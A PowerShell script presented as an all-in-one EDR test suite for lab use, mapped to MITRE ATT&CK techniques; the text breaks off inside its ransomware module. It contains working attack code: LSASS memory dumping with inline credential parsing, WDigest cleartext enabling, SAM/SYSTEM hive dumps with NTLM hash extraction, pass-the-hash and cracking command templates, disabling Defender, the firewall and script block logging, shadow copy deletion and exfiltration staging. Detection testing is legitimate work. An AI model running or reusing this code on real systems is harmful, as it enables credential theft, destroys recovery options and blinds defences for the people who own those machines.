# ============================================================
#  EDR MASTER TEST SUITE v3.0 -- All-in-One
#  Ransomware + Credential + Persistence + Evasion + BYOVD
#  Usage: powershell -ep bypass -File edr_master_suite.ps1
#  WARNING: Isolated lab environment only
# ============================================================
#  MITRE ATT&CK Coverage:
#  T1003      Credential Dumping (SAM, LSASS, WDigest)
#  T1016      Network Discovery
#  T1027      Obfuscation (7 techniques)
#  T1055      Process Injection (VirtualAllocEx, APC, Hollowing)
#  T1057      Process Discovery + EDR Fingerprint
#  T1059.001  PowerShell Execution
#  T1068      Privilege Escalation / Direct Syscall
#  T1082      System Information Discovery
#  T1105      Ingress Tool Transfer
#  T1112      Registry Modification
#  T1127.001  MSBuild Inline Task
#  T1134.004  PPID Spoofing
#  T1218      LOLBins (10 binaries)
#  T1486      Data Encrypted for Impact
#  T1490      Inhibit System Recovery
#  T1497      Sandbox/VM Evasion
#  T1543.003  Driver Service Creation
#  T1547      Persistence (RunKey, Startup, Scheduled Task)
#  T1555      Browser Credentials
#  T1562.001  AMSI Bypass (5 techniques)
#  T1620      Reflective Code Loading
# ============================================================

$global:Results  = @()
$global:Version  = "3.0"
$global:LogDir   = "$env:TEMP\EDR_Master_$(Get-Date -Format 'yyyyMMdd_HHmm')"
New-Item -ItemType Directory -Force -Path $global:LogDir | Out-Null
$global:LogFile  = "$global:LogDir\master_verbose.log"
$global:VictimDir= "$global:LogDir\victim_files"
New-Item -ItemType Directory -Force -Path $global:VictimDir | Out-Null

# ============================================================
#  SHARED HELPERS
# ============================================================

function Write-Log {
    param([string]$Text, [string]$Color = "White")
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $Text"
    Add-Content -Path $global:LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line -ForegroundColor $Color
}
function Write-Detail  { param([string]$T) Write-Log "    >> $T" "DarkGray" }
function Write-Evidence{ param([string]$T) Write-Log "    [EVIDENCE] $T" "Yellow" }
function Write-OK      { param([string]$T) Write-Log "    [+] $T" "Green" }
function Write-Fail    { param([string]$T) Write-Log "    [-] $T" "Red" }
function Write-Warn    { param([string]$T) Write-Log "    [!] $T" "DarkYellow" }

function Write-Phase {
    param([string]$ID, [string]$Name, [string]$Color = "Magenta")
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Dark$Color
    Write-Host "  [$ID] $Name" -ForegroundColor $Color
    Write-Host "=============================================" -ForegroundColor Dark$Color
    Write-Log "=== [$ID] $Name ===" $Color
}

function Log-Result {
    param([string]$Technique, [string]$Desc, [string]$Status, [string]$Detail = "")
    $global:Results += [PSCustomObject]@{
        Technique = $Technique
        Desc      = $Desc
        Status    = $Status
        Detail    = $Detail
        Time      = Get-Date -Format "HH:mm:ss"
    }
    $col = switch ($Status) {
        "EXECUTED"  { "Yellow" }
        "BLOCKED"   { "Green"  }
        "PARTIAL"   { "Cyan"   }
        "NOT_FOUND" { "Gray"   }
        default     { "Gray"   }
    }
    Write-Host "  [$Status] $Technique -- $Desc" -ForegroundColor $col
    Write-Log   "  [$Status] $Technique -- $Desc | $Detail"
}

function Pause-ForAudience {
    Write-Host ""
    Write-Host "  [DEMO] Press ENTER to continue..." -ForegroundColor DarkCyan
    Read-Host | Out-Null
}

# ============================================================
#  MODULE 1 -- RECON & DISCOVERY
# ============================================================

function Test-Recon {
    Write-Phase "T1082/T1057/T1016" "Recon & Discovery" "Cyan"

    # System info
    Write-Detail "Running: Get-WmiObject Win32_ComputerSystem + Win32_OperatingSystem"
    $cs   = Get-WmiObject Win32_ComputerSystem
    $os   = Get-WmiObject Win32_OperatingSystem
    $bios = Get-WmiObject Win32_BIOS
    $ip   = (Get-NetIPAddress -AddressFamily IPv4 |
             Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress

    Write-Host ""
    Write-Host "  === SYSTEM RECON ===" -ForegroundColor Yellow
    @{
        Hostname      = $env:COMPUTERNAME
        Username      = $env:USERNAME
        Domain        = $cs.Domain
        OS            = $os.Caption
        OS_Build      = $os.BuildNumber
        Architecture  = $os.OSArchitecture
        IP            = $ip -join ", "
        RAM_GB        = [math]::Round($cs.TotalPhysicalMemory/1GB,1)
        BIOS_Serial   = $bios.SerialNumber
        PS_Version    = $PSVersionTable.PSVersion.ToString()
        Is_VM         = if ($cs.Model -match "Virtual|VMware|VBox") { "YES -- $($cs.Model)" } else { "No" }
        Last_Boot     = $os.ConvertToDateTime($os.LastBootUpTime)
    }.GetEnumerator() | ForEach-Object {
        Write-Evidence "  $($_.Key.PadRight(16)): $($_.Value)"
    }
    Log-Result "T1082" "System info enumeration via WMI" "EXECUTED" "Host:$env:COMPUTERNAME OS:$($os.BuildNumber)"

    # Process discovery + EDR fingerprint
    Write-Host ""
    Write-Detail "Running: Get-Process -- scanning for EDR processes"
    $allProcs = Get-Process
    Write-Evidence "Total running processes: $($allProcs.Count)"

    $top10 = $allProcs | Sort-Object WorkingSet -Descending | Select-Object -First 10
    Write-Host "  === TOP 10 PROCESSES BY RAM ===" -ForegroundColor Yellow
    $top10 | ForEach-Object {
        Write-Evidence "  PID $($_.Id.ToString().PadLeft(6)) | $($_.Name.PadRight(28)) | $([math]::Round($_.WorkingSet/1MB,1)) MB"
    }

    $edrMap = @{
        "MsMpEng"="Windows Defender"; "SenseIR"="MDE"; "CSFalconService"="CrowdStrike";
        "CSAgent"="CrowdStrike Agent"; "SentinelAgent"="SentinelOne"; "cb"="CarbonBlack";
        "bdagent"="Bitdefender"; "cylancesvc"="Cylance"; "xagt"="FireEye"; "mbam"="Malwarebytes"
    }
    Write-Host ""
    Write-Detail "EDR/AV fingerprint scan..."
    $foundEDR = $false
    foreach ($e in $edrMap.GetEnumerator()) {
        $p = Get-Process $e.Key -ErrorAction SilentlyContinue
        if ($p) {
            Write-Evidence "  [EDR] $($e.Value) -- $($e.Key).exe PID:$($p.Id)"
            $foundEDR = $true
        }
    }
    if (-not $foundEDR) { Write-Evidence "  No known EDR process found" }
    Log-Result "T1057" "Process discovery + EDR fingerprint" "EXECUTED" "Procs:$($allProcs.Count) EDR:$foundEDR"

    # Network discovery
    Write-Host ""
    Write-Detail "Running: network discovery"
    $conns  = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
    $routes = Get-NetRoute -AddressFamily IPv4 -ErrorAction SilentlyContinue
    $dns    = Get-DnsClientCache -ErrorAction SilentlyContinue

    Write-Host "  === NETWORK RECON ===" -ForegroundColor Yellow
    Write-Evidence "Active TCP connections : $($conns.Count)"
    $conns | Select-Object -First 6 | ForEach-Object {
        Write-Evidence "  $($_.LocalAddress):$($_.LocalPort) --> $($_.RemoteAddress):$($_.RemotePort)"
    }
    Write-Evidence "IPv4 routes  : $($routes.Count)"
    Write-Evidence "DNS cache    : $($dns.Count) entries"
    Log-Result "T1016" "Network config discovery" "EXECUTED" "TCP:$($conns.Count) Routes:$($routes.Count) DNS:$($dns.Count)"
}

# ============================================================
#  MODULE 2 -- CREDENTIAL DUMPING
# ============================================================

function Test-Credentials {
    Write-Phase "T1003" "Credential Dumping" "Red"

    # -- WDigest enable --
    Write-Detail "Reading WDigest value BEFORE..."
    $wdBefore = reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>&1
    Write-Evidence "WDigest BEFORE: $($wdBefore -join ' ')"

    Write-Detail "Setting UseLogonCredential = 1..."
    $wd = reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f 2>&1
    Write-Evidence "reg add result: $wd"
    $wdCheck = reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>&1
    Write-Evidence "WDigest AFTER : $($wdCheck -join ' ')"
    if ($wdCheck -match "0x1") {
        Write-OK "WDigest UseLogonCredential=1 confirmed"
        Log-Result "T1003" "WDigest cleartext caching enabled" "EXECUTED" "Registry value 0x1 confirmed"
    } else {
        Log-Result "T1003" "WDigest cleartext caching" "BLOCKED" "Value not set"
    }

    # -- Create test user + force logon --
    Write-Host ""
    Write-Phase "T1003" "WDigest Test User -- Create + Force Logon" "Red"
    Write-Warn "WDigest only caches creds AFTER a logon occurs post-activation"
    Write-Warn "Creating test user and forcing programmatic logon to populate LSASS cache"

    $wdUser   = "WDigestTest"
    $wdPass   = "LabPassword123!"
    $wdDomain = $env:COMPUTERNAME

    # Supprimer si existe
    $existing = Get-LocalUser $wdUser -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Detail "User $wdUser exists -- removing first..."
        Remove-LocalUser $wdUser -ErrorAction SilentlyContinue
    }

    # Creer user
    Write-Detail "Creating local user: $wdUser / $wdPass"
    Try {
        $secPwd = ConvertTo-SecureString $wdPass -AsPlainText -Force
        New-LocalUser -Name $wdUser `
                      -Password $secPwd `
                      -FullName "WDigest Test Account" `
                      -Description "EDR Lab -- WDigest credential test" `
                      -PasswordNeverExpires `
                      -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Users" -Member $wdUser -ErrorAction SilentlyContinue
        $u = Get-LocalUser $wdUser
        Write-OK "User created: $wdUser"
        Write-Evidence "SID         : $($u.SID)"
        Write-Evidence "Enabled     : $($u.Enabled)"
        Write-Evidence "Password    : $wdPass (WDigest will cache this in LSASS)"
        Log-Result "T1003" "WDigest test user creation" "EXECUTED" "User:$wdUser SID:$($u.SID)"
    } Catch {
        Write-Fail "User creation failed: $($_.Exception.Message)"
        Log-Result "T1003" "WDigest test user creation" "BLOCKED" $_.Exception.Message
    }

    # Force logon via LogonUser API
    Write-Host ""
    Write-Detail "Forcing logon via Win32 LogonUser API to populate LSASS cache..."
    $logonCode = @"
using System;
using System.Runtime.InteropServices;
public class LogonSim {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string u, string d, string p, int t, int prov, out IntPtr tok);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    public static string DoLogon(string user, string domain, string pass, int type) {
        IntPtr token = IntPtr.Zero;
        bool ok = LogonUser(user, domain, pass, type, 0, out token);
        int err = Marshal.GetLastWin32Error();
        if (ok) { CloseHandle(token); return "SUCCESS type=" + type + " token=" + token; }
        return "FAILED type=" + type + " err=" + err + " (1326=BadCreds 5=AccessDenied)";
    }
}
"@
    Try {
        Add-Type -TypeDefinition $logonCode -ErrorAction Stop
        Write-Detail "LogonUser API loaded"

        $r2 = [LogonSim]::DoLogon($wdUser, $wdDomain, $wdPass, 2)
        Write-Evidence "Interactive logon    (type 2) : $r2"

        $r8 = [LogonSim]::DoLogon($wdUser, $wdDomain, $wdPass, 8)
        Write-Evidence "Network cleartext    (type 8) : $r8"

        $r9 = [LogonSim]::DoLogon($wdUser, $wdDomain, $wdPass, 9)
        Write-Evidence "New credentials      (type 9) : $r9"

        if ($r2 -match "SUCCESS" -or $r8 -match "SUCCESS") {
            Write-OK "Logon SUCCESS -- $wdUser credentials now cached in LSASS"
            Write-Host "    Username : $wdUser" -ForegroundColor Yellow
            Write-Host "    Domain   : $wdDomain" -ForegroundColor Yellow
            Write-Host "    Password : $wdPass   <-- doit apparaitre dans Mimikatz" -ForegroundColor Red
            Log-Result "T1003" "WDigest logon cache via LogonUser API" "EXECUTED" "User:$wdUser creds cached type=2/8"
        } else {
            Write-Warn "Logon type 2/8 failed -- trying cmdkey fallback..."
            $ck = cmdkey /add:$wdDomain /user:$wdUser /pass:$wdPass 2>&1
            Write-Evidence "cmdkey result: $ck"
            Log-Result "T1003" "WDigest logon cache" "PARTIAL" "LogonUser failed -- cmdkey used"
        }
    } Catch {
        Write-Fail "LogonUser API blocked: $($_.Exception.Message)"
        Log-Result "T1003" "WDigest LogonUser API" "BLOCKED" $_.Exception.Message
    }

    Write-Host ""
    Write-Host "  === DUMP WDIGEST CREDS FROM METERPRETER ===" -ForegroundColor Yellow
    Write-Host "  meterpreter > load kiwi" -ForegroundColor Cyan
    Write-Host "  meterpreter > creds_all" -ForegroundColor Cyan
    Write-Host "  meterpreter > lsa_dump_secrets" -ForegroundColor Cyan
    Write-Host "  Look for: $wdUser : $wdPass" -ForegroundColor Red
    Write-Host ""

    # -- LSASS Minidump + inline parse (no Metasploit needed) --
    Write-Host ""
    Write-Phase "T1003.001" "LSASS Dump + Inline Parse (console only)" "Red"
    Write-Warn "Dumping LSASS to disk then parsing WDigest creds inline via .NET"
    Write-Warn "No Metasploit needed -- output directly in this console"

    $dumpPath = "$env:TEMP\lsass_$(Get-Random).dmp"

    $dumpCode = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LsassDump {
    [DllImport("dbghelp.dll", SetLastError=true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId,
        SafeHandle hFile, uint dumpType,
        IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam
    );

    public static string Dump(string path) {
        try {
            Process[] procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) return "LSASS_NOT_FOUND";
            Process lsass = procs[0];
            using (FileStream fs = new FileStream(path, FileMode.Create)) {
                bool ok = MiniDumpWriteDump(
                    lsass.Handle, (uint)lsass.Id,
                    fs.SafeFileHandle, 0x00000002,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
                );
                if (ok) return "OK:" + new FileInfo(path).Length;
                return "FAIL:" + Marshal.GetLastWin32Error();
            }
        } catch (Exception e) {
            return "EX:" + e.Message;
        }
    }
}
"@

    Try {
        Add-Type -TypeDefinition $dumpCode -ErrorAction Stop
        Write-Detail "MiniDumpWriteDump API loaded"
        Write-Detail "Dumping LSASS to $dumpPath ..."

        $dumpResult = [LsassDump]::Dump($dumpPath)
        Write-Evidence "Dump result: $dumpResult"

        if ($dumpResult -like "OK:*") {
            $dumpSize = ($dumpResult -split ":")[1]
            Write-OK "LSASS dump created: $dumpPath ($([math]::Round([int64]$dumpSize/1MB,1)) MB)"

            # Parse le dump avec pypykatz si Python dispo
            Write-Host ""
            Write-Detail "Checking for pypykatz / Python..."
            $py = Get-Command python -ErrorAction SilentlyContinue
            if (-not $py) { $py = Get-Command python3 -ErrorAction SilentlyContinue }

            if ($py) {
                $hasPypykatz = & $py.Source -c "import pypykatz; print('OK')" 2>&1
                if ($hasPypykatz -match "OK") {
                    Write-OK "pypykatz found -- parsing dump inline..."
                    $parseScript = @"
import sys
from pypykatz.pypykatz import pypykatz as ppk
try:
    mimi = ppk.parse_minidump_file(sys.argv[1])
    print("")
    print("=" * 50)
    print("  WDIGEST CREDENTIALS FOUND")
    print("=" * 50)
    found = False
    for luid, session in mimi.logon_sessions.items():
        for cred in session.wdigest_credentials:
            if cred.username and cred.password:
                print(f"  [LUID]     {luid}")
                print(f"  [USER]     {cred.username}")
                print(f"  [DOMAIN]   {cred.domainname}")
                print(f"  [PASSWORD] {cred.password}")
                print("")
                found = True
        for cred in session.msv_credentials:
            if cred.NThash:
                print(f"  [MSV USER] {cred.username}")
                print(f"  [NT HASH]  {cred.NThash.hex()}")
                print(f"  [CRACK]    hashcat -m 1000 {cred.NThash.hex()} rockyou.txt")
                print("")
    if not found:
        print("  No WDigest cleartext creds found")
        print("  Possible reasons:")
        print("  1. WDigest was enabled AFTER last logon -- re-logon needed")
        print("  2. EDR cleared WDigest cache")
        print("  3. Windows version does not cache WDigest by default")
    print("=" * 50)
except Exception as e:
    print(f"Parse error: {e}")
"@
                    $pyScript = "$env:TEMP\parse_lsass_$(Get-Random).py"
                    Set-Content $pyScript $parseScript -Encoding UTF8

                    Write-Host ""
                    Write-Host "  =============================================" -ForegroundColor Red
                    Write-Host "  LSASS CREDENTIAL DUMP -- INLINE RESULTS" -ForegroundColor Red
                    Write-Host "  =============================================" -ForegroundColor Red

                    $parseOut = & $py.Source $pyScript $dumpPath 2>&1
                    $parseOut | ForEach-Object {
                        if ($_ -match "PASSWORD|USER|HASH") {
                            Write-Host "  $_" -ForegroundColor Yellow
                        } elseif ($_ -match "CRACK|hashcat") {
                            Write-Host "  $_" -ForegroundColor Cyan
                        } elseif ($_ -match "===|---") {
                            Write-Host "  $_" -ForegroundColor Red
                        } else {
                            Write-Host "  $_" -ForegroundColor White
                        }
                    }

                    Write-Host "  =============================================" -ForegroundColor Red
                    Remove-Item $pyScript -Force -ErrorAction SilentlyContinue
                    Log-Result "T1003.001" "LSASS dump + pypykatz inline parse" "EXECUTED" "Dump:$dumpPath Size:$dumpSize"

                } else {
                    Write-Warn "pypykatz not found -- showing manual options"
                    Write-Host ""
                    Write-Host "  Install pypykatz on this machine:" -ForegroundColor Yellow
                    Write-Host "  pip install pypykatz" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host "  Or analyze dump on Kali:" -ForegroundColor Yellow
                    Write-Host "  1. Download: meterpreter > download $dumpPath /root/follina_demo/lsass.dmp" -ForegroundColor Cyan
                    Write-Host "  2. Parse:    pypykatz lsa minidump /root/follina_demo/lsass.dmp" -ForegroundColor Cyan
                    Write-Host "  3. Look for: $wdUser : $wdPass" -ForegroundColor Red
                    Log-Result "T1003.001" "LSASS dump created (pypykatz not available)" "PARTIAL" "Dump at $dumpPath -- needs pypykatz"
                }
            } else {
                Write-Warn "Python not found -- dump created but cannot parse inline"
                Write-Host ""
                Write-Host "  Dump location: $dumpPath" -ForegroundColor Yellow
                Write-Host "  Transfer to Kali and run:" -ForegroundColor White
                Write-Host "  pypykatz lsa minidump lsass.dmp" -ForegroundColor Cyan
                Write-Host "  Look for: $wdUser : $wdPass" -ForegroundColor Red
                Log-Result "T1003.001" "LSASS dump (no Python on system)" "PARTIAL" "Dump at $dumpPath"
            }

            # Garder le dump pour transfert Kali
            Write-Host ""
            Write-OK "Dump kept at: $dumpPath"
            Write-Evidence "Transfer via Meterpreter: download $dumpPath /root/follina_demo/lsass.dmp"

        } else {
            Write-Fail "LSASS dump BLOCKED: $dumpResult"
            Write-Evidence "CrowdStrike is protecting LSASS from MiniDumpWriteDump"
            Write-Evidence "This is a positive detection -- EDR is working"
            Log-Result "T1003.001" "LSASS MiniDumpWriteDump" "BLOCKED" "EDR blocked dump: $dumpResult"
        }

    } Catch {
        Write-Fail "Dump API blocked: $($_.Exception.Message)"
        Log-Result "T1003.001" "LSASS dump" "BLOCKED" $_.Exception.Message
    }

    # LSASS access
    Write-Host ""
    Write-Detail "Attempting LSASS process access..."
    Try {
        $lsass = Get-Process lsass -ErrorAction Stop
        Write-Evidence "LSASS PID          : $($lsass.Id)"
        Write-Evidence "LSASS Working Set  : $([math]::Round($lsass.WorkingSet/1MB,1)) MB"
        Write-Evidence "LSASS Handle Count : $($lsass.HandleCount)"
        Write-Evidence "LSASS Start Time   : $($lsass.StartTime)"
        Write-OK "LSASS accessible -- EDR should alert on handle open"
        Log-Result "T1003.001" "LSASS process read access" "EXECUTED" "PID:$($lsass.Id) Handles:$($lsass.HandleCount)"
    } Catch {
        Write-Fail "LSASS blocked: $($_.Exception.Message)"
        Log-Result "T1003.001" "LSASS process access" "BLOCKED" $_.Exception.Message
    }

    # SAM dump
    Write-Host ""
    Write-Detail "Dumping SAM + SYSTEM hives..."
    $samPath    = "$env:TEMP\sam_$(Get-Random).tmp"
    $systemPath = "$env:TEMP\sys_$(Get-Random).tmp"
    $r1 = reg save HKLM\SAM $samPath /y 2>&1
    $r2 = reg save HKLM\SYSTEM $systemPath /y 2>&1
    Write-Evidence "SAM result    : $r1"
    Write-Evidence "SYSTEM result : $r2"

    if ((Test-Path $samPath) -and (Test-Path $systemPath)) {
        Write-OK "SAM + SYSTEM hives dumped"
        Write-Evidence "SAM    : $samPath ($((Get-Item $samPath).Length) bytes)"
        Write-Evidence "SYSTEM : $systemPath ($((Get-Item $systemPath).Length) bytes)"

        # Enum local users
        Write-Host ""
        Write-Host "  === LOCAL ACCOUNTS ===" -ForegroundColor Red
        $users = Get-LocalUser -ErrorAction SilentlyContinue
        foreach ($u in $users) {
            $rid = ($u.SID -split "-")[-1]
            Write-Host ""
            Write-Host "  [USER]          $($u.Name)" -ForegroundColor Yellow
            Write-Host "  [SID]           $($u.SID)" -ForegroundColor White
            Write-Host "  [RID]           $rid" -ForegroundColor White
            Write-Host "  [Enabled]       $($u.Enabled)" -ForegroundColor White
            Write-Host "  [Pwd Last Set]  $($u.PasswordLastSet)" -ForegroundColor White
            Write-Host "  [Description]   $($u.Description)" -ForegroundColor DarkGray
            Write-Host "  [NT Hash]       [use: secretsdump.py -sam sam.tmp -system sys.tmp LOCAL]" -ForegroundColor DarkRed
            Write-Host "  [Crack cmd]     hashcat -m 1000 <hash> rockyou.txt" -ForegroundColor Cyan
            Write-Evidence "User:$($u.Name) RID:$rid SID:$($u.SID) Enabled:$($u.Enabled)"
        }

        # Si Python+impacket dispo
        $py = Get-Command python -ErrorAction SilentlyContinue
        if ($py) {
            $hasImpacket = python -c "import impacket; print(impacket.__version__)" 2>&1
            if ($hasImpacket -notmatch "Error|No module") {
                Write-Host ""
                Write-Detail "impacket found ($hasImpacket) -- running secretsdump LOCAL..."
                $dumpScript = @"
from impacket.examples.secretsdump import LocalOperations, SAMHashes
import sys
lo = LocalOperations(sys.argv[2])
bk = lo.getBootKey()
print(f'BootKey: {bk.hex()}')
sh = SAMHashes(sys.argv[1], bk, isRemote=False)
sh.dump()
"@
                $pyPath = "$env:TEMP\sd_$(Get-Random).py"
                Set-Content $pyPath $dumpScript -Encoding UTF8
                Write-Host ""
                Write-Host "  === NTLM HASH DUMP ===" -ForegroundColor Red
                $out = python $pyPath $samPath $systemPath 2>&1
                $out | ForEach-Object {
                    if ($_ -match ":::") {
                        $p = $_ -split ":"
                        Write-Host "  [USER]    $($p[0])" -ForegroundColor Yellow
                        Write-Host "  [RID]     $($p[1])" -ForegroundColor White
                        Write-Host "  [LM]      $($p[2])" -ForegroundColor DarkGray
                        Write-Host "  [NTLM]    $($p[3])" -ForegroundColor Red
                        Write-Host "  [Crack]   hashcat -m 1000 '$($p[3])' rockyou.txt" -ForegroundColor Cyan
                        Write-Host "  [PTH]     pth-winexe -U '$($p[0])%$($p[3])' //TARGET cmd" -ForegroundColor Cyan
                        Write-Host ""
                    } elseif ($_ -match "BootKey") {
                        Write-Host "  $_" -ForegroundColor DarkYellow
                    }
                }
                Remove-Item $pyPath -Force -ErrorAction SilentlyContinue
                Log-Result "T1003.002" "SAM hash dump via impacket secretsdump" "EXECUTED" "Hashes extracted per user"
            }
        }
        Remove-Item $samPath,$systemPath -Force -ErrorAction SilentlyContinue
        Log-Result "T1003.002" "SAM + SYSTEM hive dump + user enumeration" "EXECUTED" "$($users.Count) accounts found"
    } else {
        Write-Fail "Hive dump blocked -- need SYSTEM privileges"
        Log-Result "T1003.002" "SAM hive dump" "BLOCKED" "reg save failed -- insufficient privileges"
    }

    # Browser creds
    Write-Host ""
    Write-Detail "Checking browser credential stores..."
    $browsers = @(
        @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"},
        @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles"}
    )
    foreach ($b in $browsers) {
        if (Test-Path $b.Path) {
            $item = Get-Item $b.Path
            Write-Evidence "$($b.Name) Login Data FOUND: $($b.Path)"
            Write-Evidence "  Modified: $($item.LastWriteTime) | Size: $(if($item -is [System.IO.FileInfo]){$item.Length}else{'(dir)'}) bytes"
            Write-OK "$($b.Name) credential store accessible"
            Log-Result "T1555" "$($b.Name) browser credentials" "EXECUTED" $b.Path
        } else {
            Log-Result "T1555" "$($b.Name) credentials" "NOT_FOUND" $b.Path
        }
    }
}

# ============================================================
#  MODULE 3 -- DEFENSE IMPAIRMENT
# ============================================================

function Test-DefenseImpairment {
    Write-Phase "T1562" "Impair Defenses" "Red"

    # Defender status before
    Write-Detail "Reading Defender preferences before modification..."
    Try {
        $before = Get-MpPreference -ErrorAction Stop
        Write-Evidence "RealTimeMonitoring BEFORE : $($before.DisableRealtimeMonitoring)"
        Write-Evidence "BehaviorMonitoring BEFORE : $($before.DisableBehaviorMonitoring)"
        Write-Evidence "ScriptScanning     BEFORE : $($before.DisableScriptScanning)"
    } Catch { Write-Evidence "Could not read MpPreference: $($_.Exception.Message)" }

    # Disable realtime
    Write-Detail "Attempting: Set-MpPreference -DisableRealtimeMonitoring `$true"
    Try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        $after = Get-MpPreference
        Write-Evidence "RealTimeMonitoring AFTER  : $($after.DisableRealtimeMonitoring)"
        if ($after.DisableRealtimeMonitoring) {
            Write-OK "Realtime monitoring DISABLED -- EDR did not block"
            Log-Result "T1562" "Disable Defender realtime monitoring" "EXECUTED" "Confirmed via Get-MpPreference"
        } else {
            Log-Result "T1562" "Disable Defender realtime monitoring" "BLOCKED" "Value unchanged"
        }
    } Catch {
        Write-Fail $_.Exception.Message
        Log-Result "T1562" "Disable Defender realtime monitoring" "BLOCKED" $_.Exception.Message
    }

    # Firewall
    Write-Host ""
    Write-Detail "Attempting: netsh advfirewall set allprofiles state off"
    $fw = netsh advfirewall set allprofiles state off 2>&1
    Write-Evidence "Result: $fw"
    $fwCheck = netsh advfirewall show allprofiles state 2>&1
    Write-Evidence "Status: $($fwCheck -join ' | ')"
    if ($fwCheck -match "OFF") {
        Write-OK "Firewall disabled on all profiles"
        Log-Result "T1562" "Disable Windows Firewall" "EXECUTED" "All profiles OFF confirmed"
    } else {
        Log-Result "T1562" "Disable Windows Firewall" "BLOCKED" "Firewall still active"
    }

    # Disable script block logging
    Write-Host ""
    Write-Detail "Attempting: disable PowerShell Script Block Logging"
    $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    Try {
        if (-not (Test-Path $sbPath)) { New-Item $sbPath -Force | Out-Null }
        Set-ItemProperty $sbPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction Stop
        $val = (Get-ItemProperty $sbPath).EnableScriptBlockLogging
        Write-Evidence "ScriptBlockLogging registry: $val"
        if ($val -eq 0) {
            Write-OK "Script block logging disabled -- PS commands no longer logged to Event ID 4104"
            Log-Result "T1562" "Disable PS Script Block Logging" "EXECUTED" "EnableScriptBlockLogging=0"
        } else {
            Log-Result "T1562" "Disable PS Script Block Logging" "BLOCKED" "Value unchanged"
        }
    } Catch {
        Log-Result "T1562" "Disable PS Script Block Logging" "BLOCKED" $_.Exception.Message
    }
}

# ============================================================
#  MODULE 4 -- RANSOMWARE SIMULATION
# ============================================================

function Test-Ransomware {
    Write-Phase "T1486/T1490" "Ransomware Simulation" "Red"

    # Create victim files
    Write-Detail "Creating victim files..."
    $testDir = "$global:VictimDir\ransomware_test"
    New-Item -ItemType Directory -Force -Path $testDir | Out-Null

    $files = @{
        "rapport_financier_Q1.txt" = "RAPPORT FINANCIER Q1 2024`nRevenu: 4,250,000$`nMarge: 18.3%`nCONFIDENTIEL"
        "liste_clients.csv"        = "Nom,Email,Tel`nTremblay,jean@corp.com,514-555-0101`nLeblanc,marie@corp.com,438-555-0202"
        "server_creds.txt"         = "SRV-PROD: admin/P@ssw0rd2024!`nDB: sa/Sql$ecret99`nVPN: user/Winter2024#"
        "plan_strategique.txt"     = "ACQUISITION: CompetitorCo`nBudget: 12M$`nTimeline: Q3 2024`nCONFIDENTIEL"
        "aws_keys.txt"             = "AWS_KEY=AKIAIOSFODNN7EXAMPLE`nAWS_SECRET=wJalrXUtnFEMI/K7MDENG"
    }
    foreach ($f in $files.GetEnumerator()) {
        Set-Content "$testDir\$($f.Key)" $f.Value
        Write-Evidence "Created: $($f.Key) ($((Get-Item "$testDir\$($f.Key)").Length) bytes)"
    }

    # Shadow copies
    Write-Host ""
    Write-Detail "Listing shadow copies before deletion..."
    $vssBefore = vssadmin list shadows 2>&1
    $vssBefore | Select-Object -First 5 | ForEach-Object { Write-Evidence "  $_" }

    Write-Detail "Running: vssadmin delete shadows /all /quiet"
    vssadmin delete shadows /all /quiet 2>$null | Out-Null
    $vssAfter = vssadmin list shadows 2>&1
    Write-Evidence "After: $($vssAfter -join ' ')"
    if ($vssAfter -match "No items") {
        Write-OK "Shadow copies deleted -- recovery inhibited"
        Log-Result "T1490" "VSS shadow copy deletion" "EXECUTED" "vssadmin delete /all"
    } else {
        Log-Result "T1490" "VSS shadow copy deletion" "BLOCKED" "Shadows still present"
    }

    # bcdedit
    Write-Detail "Running: bcdedit /set {default} recoveryenabled No"
    Try {
        $bcd = bcdedit /set "{default}" recoveryenabled No 2>&1
        Write-Evidence "bcdedit result: $bcd"
        $bcdCheck = bcdedit /enum "{default}" 2>&1 | Select-String "recoveryenabled"
        Write-Evidence "bcdedit verify: $bcdCheck"
        if ($bcd -match "successfully") {
            Write-OK "Windows Recovery disabled"
            Log-Result "T1490" "Disable Windows Recovery (bcdedit)" "EXECUTED" "recoveryenabled=No"
        } else {
            Log-Result "T1490" "bcdedit recovery disable" "BLOCKED" "$bcd"
        }
    } Catch { Log-Result "T1490" "bcdedit" "BLOCKED" $_.Exception.Message }

    # Exfiltration simulation
    Write-Host ""
    Write-Detail "Simulating data exfiltration (compress + stage for C2)..."
    $exfilZip = "$env:TEMP\exfil_$(Get-Date -Format 'yyyyMMdd').zip"
    Compress-Archive -Path $testDir -DestinationPath $exfilZip -Force
    Write-Evidence "Compressed to: $exfilZip ($((Get-Item $exfilZip).Length) bytes)"
    Write-OK "Exfil archive created -- in real attack: uploaded to C2 before encryption"
    Log-Result "T1041" "Data exfiltration simulation (ZIP staging)" "EXECUTED" "$((Get-Item $exfilZip).Length) bytes"
